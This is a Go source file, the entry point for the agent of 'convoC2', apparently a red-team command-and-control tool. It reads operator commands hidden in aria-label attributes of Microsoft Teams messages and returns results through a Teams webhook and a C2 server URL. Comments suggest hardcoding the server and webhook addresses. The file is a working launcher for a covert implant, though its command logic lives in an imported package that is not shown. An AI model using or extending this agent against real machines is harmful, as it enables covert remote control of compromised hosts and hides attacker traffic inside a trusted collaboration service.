package main

import (
	"flag"
	"fmt"
	"os"
	"regexp"

	"github.com/cxnturi0n/convoC2/pkg/agent"
)

var (
	verbose      bool
	serverURL    string
	timeout      int
	webhookURL   string
	commandRegex string
)

func init() {
	flag.BoolVar(&verbose, "v", false, "")
	flag.StringVar(&serverURL, "s", "", "") // Insert in third parameter if you want to hardcode serverURL
	flag.IntVar(&timeout, "t", 1, "")
	flag.StringVar(&webhookURL, "w", "", "") // Insert in third parameter if you want to hardcode webhookURL
	flag.StringVar(&commandRegex, "r", `<span[^>]*aria-label="([^"]*)"[^>]*></span>`, "") // For now use the default because server only supports aria-label injection

	flag.BoolVar(&verbose, "verbose", false, "")
	flag.StringVar(&serverURL, "server", "", "") // Insert in third parameter if you want to hardcode serverURL
	flag.IntVar(&timeout, "timeout", 1, "")
	flag.StringVar(&webhookURL, "webhook", "", "") // Insert in third parameter if you want to hardcode webhookURL
	flag.StringVar(&commandRegex, "regex", `<span[^>]*aria-label="([^"]*)"[^>]*></span>`, "") // For now use the default because server only supports aria-label injection
}

func main() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of convoC2 agent:\n")
		fmt.Fprintf(os.Stderr, "  -v, --verbose   Verbose logging (default false)\n")
		fmt.Fprintf(os.Stderr, "  -s, --server    C2 server URL (i.e. http://10.11.12.13/)\n")
		fmt.Fprintf(os.Stderr, "  -t, --timeout   Teams log file polling timeout [s] (default 1)\n")
		fmt.Fprintf(os.Stderr, "  -w, --webhook   Teams Webhook POST URL\n")
		fmt.Fprintf(os.Stderr, `  -r, --regex     Regex to match command (default "<span[^>]*aria-label=\"([^\"]*)\"[^>]*></span>")`)
	}

	flag.Parse()

	err := agent.Start(verbose, serverURL, timeout, webhookURL, regexp.MustCompile(commandRegex))
	if err != nil {
		fmt.Fprintln(os.Stderr, "Agent failed to run:", err)
		os.Exit(1)
	}
}
